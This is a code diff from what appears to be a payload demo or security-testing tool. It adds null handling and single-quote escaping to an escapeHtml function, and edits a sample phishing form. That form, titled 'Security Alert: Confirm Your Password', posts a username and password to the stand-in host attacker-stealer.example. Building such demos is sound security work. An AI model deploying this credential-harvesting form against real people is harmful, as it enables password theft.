@@ -22,7 +22,7 @@ const SAMPLE_PAYLOADS = {
   <h2>Security Alert: Confirm Your Password</h2>
   <form action="https://attacker-stealer.example/collect" method="POST">
     <p>Please enter your verification credentials below:</p>
-    <label>Username: <input type="text" name="user" value="victim@domain.com"></label>
+    <label>Username: <input type="text" name="user" value="victim@example.com"></label>
     <label>Current Password: <input type="password" name="pass"></label>
     <button type="submit" onclick="alert('Credentials sent to evil server!')">Confirm & Save</button>
   </form>
@@ -333,7 +333,13 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   function escapeHtml(str) {
-    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+    if (!str) return '';
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
   }
 
   function switchTab(activeView) {
